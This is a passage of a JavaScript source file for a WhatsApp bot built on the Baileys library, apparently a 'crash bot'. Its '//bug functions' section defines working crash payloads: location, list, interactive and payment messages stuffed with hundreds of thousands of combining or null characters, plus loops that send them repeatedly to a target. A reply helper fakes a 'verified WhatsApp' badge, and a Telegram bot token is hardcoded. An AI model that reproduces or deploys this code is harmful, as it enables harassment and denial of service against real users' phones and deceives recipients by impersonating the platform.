const { default: makeWASocket, fetchLatestBaileysVersion, downloadContentFromMessage, useMultiFileAuthState, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@whiskeysockets/baileys')
const ytdl = require('ytdl-core');
const os = require('os')
const fs = require('fs') 
const fsx = require('fs-extra')
const path = require('path')
const util = require('util')
const chalk = require('chalk')
const moment = require('moment-timezone')
const speed = require('performance-now')
const ms = toMs = require('ms')
const axios = require('axios')
const fetch = require('node-fetch')
const pino = require('pino')
const readline = require("readline");
const { exec, spawn, execSync } = require("child_process")
const { performance } = require('perf_hooks')
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const { TelegraPh, UploadFileUgu, webp2mp4File, floNime } = require('./lib/uploader')
const { toAudio, toPTT, toVideo, ffmpeg, addExifAvatar } = require('./lib/converter')
const { smsg, getGroupAdmins, formatp, jam, formatDate, getTime, isUrl, await, sleep, clockString, msToDate, sort, toNumber, enumGetKey, runtime, fetchJson, getBuffer, json, delay, format, logic, generateProfilePicture, parseMention, getRandom, pickRandom, reSize } = require('./lib/myfunc')
let afk = require("./lib/afk");
const { addPremiumUser, getPremiumExpired, getPremiumPosition, expiredCheck, checkPremiumUser, getAllPremiumUser } = require('./lib/premiun')
const { fetchBuffer, buffergif } = require("./lib/myfunc")
const NodeCache = require('node-cache');
const mmks = fs.readFileSync(`./JapaneseGuys/mmk.jpg`)
const { MsbreewcXdelta2 } = require('./JapaneseGuys/MsbreewcXdelta2')
const wkwk = fs.readFileSync(`./JapaneseGuys/x.mp3`)
const xsteek = fs.readFileSync(`./JapaneseGuys/x.webp`)
const o = fs.readFileSync(`./JapaneseGuys/o.jpg`)

//database
let premium = JSON.parse(fs.readFileSync('./database/premium.json'))
let _owner = JSON.parse(fs.readFileSync('./database/owner.json'))
let owner = JSON.parse(fs.readFileSync('./database/owner.json'))
let _afk = JSON.parse(fs.readFileSync('./database/afk-user.json'))
let hit = JSON.parse(fs.readFileSync('./database/total-hit-user.json'))

//autorep
const VoiceNotefuckdel = JSON.parse(fs.readFileSync('./database/autoreply/vn.json'))
const Stickerfuckdel = JSON.parse(fs.readFileSync('./database/autoreply/sticker.json'))
const Imagefuckdel = JSON.parse(fs.readFileSync('./database/autoreply/image.json'))
const Videofuckdel = JSON.parse(fs.readFileSync('./database/autoreply/video.json'))
const Docfuckdel = JSON.parse(fs.readFileSync('./database/autoreply/doc.json'))
const Zipfuckdel = JSON.parse(fs.readFileSync('./database/autoreply/zip.json'))
const Apkfuckdel = JSON.parse(fs.readFileSync('./database/autoreply/apk.json'))

const aikamemek = ''.repeat(99999999);
async function ngeloc(target, kuwoted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `ↁׁׅ݊эׁׅмׁׅ֪оׁׅиׁׅ֮᥎꫶ׁׅꪱׁׅꭈׁׅυׁׅ꯱ׁׅ֒⃟╮.╮⭑⃰͜͡؜Demon⃟id᜴S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰😹⃟╮.xp`+"S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰ꦾ".repeat(9999999),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: kuwoted })
await deltacrashgcinc.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}

//time
const xtime = moment.tz('Africa/Lagos').format('HH:mm:ss')
        const xdate = moment.tz('Africa/Lagos').format('DD/MM/YYYY')
        const time2 = moment().tz('Africa/Lagos').format('HH:mm:ss')  
         if(time2 < "23:59:00"){
var fuckdelytimewisher = `Good Night`
 }
 if(time2 < "19:00:00"){
var fuckdelytimewisher = `Good Evening`
 }
 if(time2 < "18:00:00"){
var fuckdelytimewisher = `Good Evening`
 }
 if(time2 < "15:00:00"){
var fuckdelytimewisher = `Good Afternoon`
 }
 if(time2 < "11:00:00"){
var fuckdelytimewisher = `Good Morning`
 }
 if(time2 < "05:00:00"){
var fuckdelytimewisher = `Good Morning`
 } 
module.exports = deltacrashgcinc = async (deltacrashgcinc, m, msg, chatUpdate, store) => {
    try {
        const {
            type,
            quotedMsg,
            mentioned,
            now,
            fromMe
        } = m
        var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectdeltacrashrevolutionReply.selectedRowId : (m.mtype == 'templateButtondeltacrashrevolutionReplyMessage') ? m.message.templateButtondeltacrashrevolutionReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectdeltacrashrevolutionReply.selectedRowId || m.text) : ''
        var budy = (typeof m.text == 'string' ? m.text : '')
        var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
        const isCmd = body.startsWith(prefix)
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const full_args = body.replace(command, '').slice(1).trim()
        const pushname = m.pushName || "Blue demon"
        const botNumber = await deltacrashgcinc.decodeJid(deltacrashgcinc.user.id)
        const itsMe = m.sender == botNumber ? true : false
        const sender = m.sender
        const text = q = args.join(" ")
        const from = m.key.remoteJid
        const fatkuns = (m.quoted || m)
        const quoted = (fatkuns.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] : (fatkuns.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : (fatkuns.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const qmsg = (quoted.msg || quoted)
        const isMedia = /image|video|sticker|audio/.test(mime)
        const isImage = (type == 'imageMessage')
        const isVideo = (type == 'videoMessage')
        const isAudio = (type == 'audioMessage')
        const isText = (type == 'textMessage')
        const isSticker = (type == 'stickerMessage')
        const isQuotedText = type === 'extendexTextMessage' && content.includes('textMessage')
        const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
        const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
        const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
        const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
        const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
        const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
        const sticker = []
        const isAfkOn = afk.checkAfkUser(m.sender, _afk)
        const isGroup = m.key.remoteJid.endsWith('@g.us')
        const groupMetadata = m.isGroup ? await deltacrashgcinc.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
        const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
        const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false
        const isCreator = [ownernumber, ..._owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const isPremium = isCreator || isCreator || checkPremiumUser(m.sender, premium);
        const clientId = deltacrashgcinc.user.id.split(':')[0];
        const senderbot = m.key.fromMe ? deltacrashgcinc.user.id.split(':')[0] + "@s.whatsapp.net" || deltacrashgcinc.user.id : m.key.participant || m.key.remoteJid;
        const senderId = senderbot.split('@')[0];
        const isBot = clientId.includes(senderId);
        expiredCheck(deltacrashgcinc, m, premium);
//group chat msg by fuckdel


let ppuser
try {
ppuser = 'https://c.top4top.io/s_3182j4j9u0.jpg'
} catch (err) {
ppuser = 'https://c.top4top.io/s_3182j4j9u0.jpg'
}

async function deltacrashrevolutionReply(teks) {
    return deltacrashgcinc.sendMessage(m.chat, {
        text: teks,
        contextInfo: {
            mentionedJid: [m.sender], // Mentions the sender
            // Removed forwardingScore and isForwarded to avoid forwarding look
            externalAdReply: {
                showAdAttribution: true, // Shows attribution to the ad
                containsAutoReply: true, // Indicate this contains auto-reply
                title: `ʙʟᴜᴇᴅᴇᴍᴏɴ ᴛᴇᴄʜ - ᴅᴇᴍᴏɴ x ᴠɪᴘ`, // Bot name from global settings
                body: `𝖕𝖗𝖔𝖙𝖊𝖈𝖙 𝖙𝖍𝖔𝖘𝖊 𝖞𝖔𝖚 𝖑𝖔𝖛𝖊💕`, // Owner name
                previewType: "PHOTO",
                thumbnailUrl: 'https://c.top4top.io/s_3182j4j9u0.jpg', // Empty if not using URL
           // Use the same thumbnail as in replyglobal
                sourceUrl: `${link}`, // Source URL, could be your bot's website or a reference link
                verified: true, // Custom attribute to simulate a verified look (even though not official)
                verifiedName: "WhatsApp", // Simulate a verification from WhatsApp itself
                verifiedBadge: true // Simulate a badge for verification
            }
        }
    }, {
        quoted: m // Quotes the original message
    });
}

async function Telesticker(url) {
    return new Promise(async (resolve, reject) => {
        if (!url.match(/(https:\/\/t.me\/addstickers\/)/gi)) return deltacrashrevolutionReply('Enter your telegram sticker url link')
        packName = url.replace("https://t.me/addstickers/", "")
        data = await axios(`https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getStickerSet?name=${encodeURIComponent(packName)}`, {method: "GET",headers: {"User-Agent": "GoogleBot"}})
        const fuckdelyresult = []
        for (let i = 0; i < data.data.result.stickers.length; i++) {
            fileId = data.data.result.stickers[i].thumb.file_id
            data2 = await axios(`https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getFile?file_id=${fileId}`)
            result = {
            status: 200,
            author: 'BLUEDEMON',
            url: "https://api.telegram.org/file/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/" + data2.data.result.file_path
            }
            fuckdelyresult.push(result)
        }
    resolve(fuckdelyresult)
    })
}

//bug functions







const fsaluran = { key : {
remoteJid: '0@s.whatsapp.net',
participant : '0@s.whatsapp.net'
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: '120363312773734994@newsletter',
    newsletterName: '',
    caption: body
}}}
async function locationcrash(target, kuwoted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `ジンクスバグ 𝘡𝘺𝘯𝘹𝘻𝘰𝘰 ジンクスバグ 𝘡𝘺𝘯𝘹𝘻𝘰𝘰 ジンクスバグ 𝘡𝘺𝘯𝘹𝘻𝘰𝘰 ジンクスバグ 𝘡𝘺𝘯𝘹𝘻𝘰𝘰 ジンクスバグ 𝘡𝘺𝘯𝘹𝘻𝘰𝘰 ジンクスバグ 𝘡𝘺𝘯𝘹𝘻𝘰𝘰 ジンクスバグ 𝘡𝘺𝘯𝘹𝘻𝘰𝘰 ジンクスバグ 𝘡𝘺𝘯𝘹𝘻𝘰𝘰`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: kuwoted })
await Zynxzoo.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}

async function blackening(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "stickerMessage": {
    "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
    "fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
    "fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
    "mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
    "mimetype": "image/webp",
    "directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
    "fileLength": "10116",
    "mediaKeyTimestamp": "1715876003",
    "isAnimated": false,
    "stickerSentTs": "1715881084144",
    "isAvatar": false,
    "isAiSticker": false,
    "isLottie": false
  }
}), { userJid: target, quoted: kuwoted });
await Zynxzoo.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}


const force = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./JapaneseGuys/xx1.png`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"INR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"ↁׁׅ݊эׁׅмׁׅ֪оׁׅиׁׅ֮᥎꫶ׁׅꪱׁׅꭈׁׅυׁׅ꯱ׁׅ֒⃟☴ ☵ ☶ ☷ↁׁׅ݊эׁׅмׁׅ֪оׁׅиׁׅ֮᥎꫶ׁׅꪱׁׅꭈׁׅυׁׅ꯱ׁׅ֒⃟§\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}

const force2 = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./JapaneseGuys/xx1.png`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️᷍ↁэмоихvіѓцѕ╮⭑ ☠️⃰͜͡؜ↁэмоихvіѓцѕ⃟᜴ↁэмоихvіѓцѕ§⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}

const oneclickfuckdel = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
listResponseMessage: {
title: `Blûédëmøñ`
}
}
}

async function locationfuckdely(target, kuwoted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `BLŪËVÍRÚS彡`+"ꦾ".repeat(60000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: kuwoted })
await deltacrashgcinc.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}

async function fuckdelkillpic(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      header: {
        title: "BLŪËVÍRÚS",
        hasMediaAttachment: true,
        ...(await prepareWAMessageMedia({ image: { url: "https://i.ibb.co/Wppj16p/cheemspic.jpg" } }, { upload: deltacrashgcinc.waUploadToServer }))
      },
      body: {
        text: ""
      },
      footer: {
        text: "›          #BLŪËVÍRÚS"
      },
      nativeFlowMessage: {
        messageParamsJson: " ".repeat(1000000)
      }
    }
}), { userJid: target, quoted: kuwoted });
await deltacrashgcinc.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

async function aipong(target) {
await deltacrashgcinc.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
}

async function listfuckdelfck(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  'listMessage': {
    'title': "BLŪËVÍRÚS"+" ".repeat(920000),
        'footerText': `BLŪËVÍRÚ§`,
        'description': `BLŪËVÍRÚ§BLŪËVÍRÚ§`,
        'buttonText': null,
        'listType': 2,
        'productListInfo': {
          'productSections': [{
            'title': 'anjay',
            'products': [
              { "productId": "4392524570816732" }
            ]
          }],
          'productListHeaderImage': {
            'productId': '4392524570816732',
            'jpegThumbnail': null
          },
          'businessOwnerJid': '0@s.whatsapp.net'
        }
      },
      'footer': 'puki',
      'contextInfo': {
        'expiration': 604800,
        'ephemeralSettingTimestamp': "1679959486",
        'entryPointConversionSource': "global_search_new_chat",
        'entryPointConversionApp': "whatsapp",
        'entryPointConversionDelaySeconds': 9,
        'disappearingMode': {
          'initiator': "INITIATED_BY_ME"
        }
      },
      'selectListType': 2,
      'product_header_info': {
        'product_header_info_id': 292928282928,
        'product_header_is_rejected': false
      }
    }), { userJid: target, quoted: oneclickfuckdel });
await deltacrashgcinc.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}


const sendReaction = async reactionContent => {
  deltacrashgcinc.sendMessage(m.chat, {
    'react': {
      'text': reactionContent,
      'key': m.key
    }
  });
};

async function sendRepeatedMessages(jid, count) {
  for (let i = 0; i < count; i++) {
   deltacrashgcinc.sendMessage(recipientJid, {
      'text': ''.repeat(50000)
    }, {
      'participant': {
        'jid': jid
      },
      'messageId': etc.key.id
    }, {
      'quoted': m
    });
  }
}

async function sendViewOnceMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    let messageContent = generateWAMessageFromContent(jid, {
      'viewOnceMessage': {
        'message': {
          'messageContextInfo': {
            'deviceListMetadata': {},
            'deviceListMetadataVersion': 2
          },
          'interactiveMessage': proto.Message.InteractiveMessage.create({
            'body': proto.Message.InteractiveMessage.Body.create({
              'text': ''
            }),
            'footer': proto.Message.InteractiveMessage.Footer.create({
              'text': ''
            }),
            'header': proto.Message.InteractiveMessage.Header.create({
              'title': '',
              'subtitle': '',
              'hasMediaAttachment': false
            }),
            'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
              'buttons': [{
                'name': "cta_url",
                'buttonParamsJson': "{\"display_text\":\"ྦྷ\".repeat(50000),\"url\":\"https://www.google.com\",\"merchant_url\":\"https://www.google.com\"}"
              }],
              'messageParamsJson': "\0".repeat(100000)
            })
          })
        }
      }
    }, {});
    deltacrashgcinc.relayMessage(jid, messageContent.message, {
      'messageId': messageContent.key.id
    });
  }
}

async function sendSystemCrashMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'interactiveMessage': {
          'header': {
            'title': '',
            'subtitle': " "
          },
          'body': {
            'text': "S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸"
          },
          'footer': {
            'text': 'xp'
          },
          'nativeFlowMessage': {
            'buttons': [{
              'name': 'cta_url',
              'buttonParamsJson': "{ display_text : 'S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸', url : , merchant_url :  }"
            }],
            'messageParamsJson': "\0".repeat(1000000)
          }
        }
      }
    }
  }), {
    'userJid': jid
  });
  await deltacrashgcinc.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}
async function sendListMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'listMessage': {
      'title': "S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸" + "\0".repeat(920000),
      'footerText': "ↁׁׅ݊эׁׅмׁׅ֪оׁׅиׁׅ֮᥎꫶ׁׅꪱׁׅꭈׁׅυׁׅ꯱ׁׅ֒⃟╮",
      'description': "ↁׁׅ݊эׁׅмׁׅ֪оׁׅиׁׅ֮᥎꫶ׁׅꪱׁׅꭈׁׅυׁׅ꯱ׁׅ֒⃟╮",
      'buttonText': null,
      'listType': 2,
      'productListInfo': {
        'productSections': [{
          'title': "lol",
          'products': [{
            'productId': "4392524570816732"
          }]
        }],
        'productListHeaderImage': {
          'productId': "4392524570816732",
          'jpegThumbnail': null
        },
        'businessOwnerJid': "0@s.whatsapp.net"
      }
    },
    'footer': "lol",
    'contextInfo': {
      'expiration': 600000,
      'ephemeralSettingTimestamp': "1679959486",
      'entryPointConversionSource': "global_search_new_chat",
      'entryPointConversionApp': "whatsapp",
      'entryPointConversionDelaySeconds': 9,
      'disappearingMode': {
        'initiator': "INITIATED_BY_ME"
      }
    },
    'selectListType': 2,
    'product_header_info': {
      'product_header_info_id': 292928282928,
      'product_header_is_rejected': false
    }
  }), {
    'userJid': jid
  });
  
  await deltacrashgcinc.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

async function sendLiveLocationMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'liveLocationMessage': {
          'degreesLatitude': 'p',
          'degreesLongitude': 'p',
          'caption': 'ׁׅ݊ↁׁׅ݊эׁׅмׁׅ֪оׁׅиׁׅ֮᥎꫶ׁׅꪱׁׅꭈׁׅυׁׅ꯱ׁׅ֒⃟' + 'ꦾ'.repeat(80000),
          'sequenceNumber': '0',
          'jpegThumbnail': ''
        }
      }
    }
  }), {
    'userJid': jid
  });
  
  await deltacrashgcinc.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

async function sendExtendedTextMessage(jid) {
  deltacrashgcinc.relayMessage(jid, {
    'extendedTextMessage': {
      'text': '.',
      'contextInfo': {
        'stanzaId': jid,
        'participant': jid,
        'quotedMessage': {
          'conversation': '؂ↁׁׅ݊эׁׅмׁׅ֪оׁׅиׁׅ֮᥎꫶ׁׅꪱׁׅꭈׁׅυׁׅ꯱ׁׅ֒⃟' + 'ꦾ'.repeat(80000)
        },
        'disappearingMode': {
          'initiator': "CHANGED_IN_CHAT",
          'trigger': "CHAT_SETTING"
        }
      },
      'inviteLinkGroupTypeV2': "DEFAULT"
    }
  }, {
    'participant': {
      'jid': jid
    }
  }, {
    'messageId': null
  });
}
async function sendPaymentInvite(jid) {
  deltacrashgcinc.relayMessage(jid, {
    'paymentInviteMessage': {
      'serviceType': "UPI",
      'expiryTimestamp': Date.now() + 86400000
    }
  }, {
    'participant': {
      'jid': jid
    }
  });
}

async function sendMultiplePaymentInvites(jid, count) {
  for (let i = 0; i < count; i++) {
    sendPaymentInvite(jid);
    sendExtendedTextMessage(jid);
    await sleep(500);
  }
}

async function sendVariousMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    sendListMessage(jid);
    sendLiveLocationMessage(jid);
    sendSystemCrashMessage(jid);
    await sleep(500);
  }
}

async function sendRepeatedMessages2(jid, count) {
  for (let i = 0; i < count; i++) {
    sendSystemCrashMessage(jid);
    sendSystemCrashMessage(jid);
    sendSystemCrashMessage(jid);
    await sleep(500);
  }
}

async function sendMixedMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    sendLiveLocationMessage(jid);
    sendListMessage(jid);
    await sleep(500);
  }
}

function sendMessageWithMentions(text, mentions = [], quoted = false) {
  if (quoted == null || quoted == undefined || quoted == false) {
    return deltacrashgcinc.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  } else {
    return deltacrashgcinc.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  }
}

const xbug2 = {
key: {
remoteJid: 'status@broadcast',
fromMe: false, 
participant: '0@s.whatsapp.net'
},
message: {
listResponseMessage: {
title: botname
}
}
}

const fakeflow = {
key: {
remoteJid: 'status@broadcast',
fromMe: false,
participant: '0@s.whatsapp.net'
},
'message': {
"interactiveMessage": {
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": bimg
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"INR\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"total_amount\":{\"value\":45416739902,\"offset\":100},\"reference_id\":\"40NRXY65HS6\",\"type\":\"physical-goods\",\"order\":{\"status\":\"preparing_to_ship\",\"description\":\"\",\"subtotal\":{\"value\":29759959800,\"offset\":100},\"tax\":{\"value\":14805580001,\"offset\":100},\"discount\":{\"value\":148799799,\"offset\":100},\"shipping\":{\"value\":99999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7537631592926009\",\"product_id\":\"7538731592926009\",\"name\":\"${botname}\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":999999},{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"${ownername}\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":999999},{\"retailer_id\":\"custom-item-2465f31c-4f49-46eb-9ad0-5ec5121a9c0d\",\"name\":\"\",\"amount\":{\"value\":99999900,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-13746d0a-55f0-4942-86b2-2094bc9a2978\",\"name\":\"\",\"amount\":{\"value\":99999800,\"offset\":100},\"quantity\":999999},{\"retailer_id\":\"custom-item-ab993749-045b-4f66-a1d3-264fe18fb1d0\",\"name\":\"\",\"amount\":{\"value\":99999900,\"offset\":100},\"quantity\":999999}]},\"additional_note\":\"\",\"native_payment_methods\":[]}`
}
]
}
}
}
};

const fuckdelimun = (texto) => {
deltacrashgcinc.sendMessage(from, { text: texto, mentions: [sender]}, {quoted: m }).catch(e => {
return reply("Erro..")
})
}

const subscribe_dgfuckdel = {
"key": { 
"fromMe": false,
"participant": '0@s.whatsapp.net',
"remoteJid": 'status@broadcast' 
},
message: {
"listResponseMessage": {
title: `ↁׁׅ݊эׁׅмׁׅ֪оׁׅиׁׅ֮᥎꫶ׁׅꪱׁׅꭈׁׅυׁׅ꯱ׁׅ֒⃟`
}}
}
async function fuckdelyCrashy(dgfuckdel,chat) {
deltacrashgcinc.sendMessage(chat, {
document: {url: './settings.js'},
mimetype: `image/null`,
fileName: `${dgfuckdel}.${MsbreewcXdelta2}` ,
caption: `${dgfuckdel + MsbreewcXdelta2}`,
}, {quoted: subscribe_dgfuckdel })
}
//end bug functions

async function loading () {
var fuckdellod = [
"《 █▒▒▒▒▒▒▒▒▒▒▒》10%",
"《 ████▒▒▒▒▒▒▒▒》30%",
"《 ███████▒▒▒▒▒》50%",
"《 ██████████▒▒》80%",
"《 ████████████》100%",
"𝙻𝙾𝙰𝙳𝙸𝙽𝙶 𝙲𝙾𝙼𝙿𝙻𝙴𝚃𝙴𝙳 🦄..."
]
let { key } = await deltacrashgcinc.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'})

for (let i = 0; i < fuckdellod.length; i++) {
await deltacrashgcinc.sendMessage(from, {text: fuckdellod[i], edit: key });
}
}

        if (!deltacrashgcinc.public) {
            if (!isCreator && !m.key.fromMe) return
        }
        
        if (autoread) {
            deltacrashgcinc.readMessages([m.key])
        }
        
 /*       if (global.autoTyping) {
        deltacrashgcinc.sendPresenceUpdate('composing', from)
        }

        if (global.autoRecording) {
        deltacrashgcinc.sendPresenceUpdate('recording', from)
        }

        
        //bot number online status, available=online, unavailable=offline
        deltacrashgcinc.sendPresenceUpdate('uavailable', from)
        
        if (global.autorecordtype) {
        let fuckdelrecordin = ['recording','composing']
